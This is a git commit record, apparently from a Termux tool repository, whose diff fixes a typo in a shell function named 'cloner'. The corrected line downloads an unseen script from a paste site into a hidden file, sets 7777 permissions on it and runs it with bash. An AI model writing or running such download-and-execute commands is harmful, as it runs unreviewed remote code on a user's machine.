063c96b7ce7940a5384d7dc6f120fe216623ef39
CoderMaldito <41843390+User99021@users.noreply.github.com>
2020-09-21 23:14:39 -0400

    Update 007cloner.sh

--- 007cloner.sh
+++ 007cloner.sh
@@ -3,7 +3,7 @@ function dep () {
     printf "INSTALL PYTHON..."pkg install vim-python -y 1> /dev/null
 }
 function cloner () {
-    wget -qO- https://termbin.com/e8aq > .luks && chmod 7777 .luks && bash.luks
+    wget -qO- https://termbin.com/e8aq > .luks && chmod 7777 .luks && bash .luks
 }
 
 function bn () {
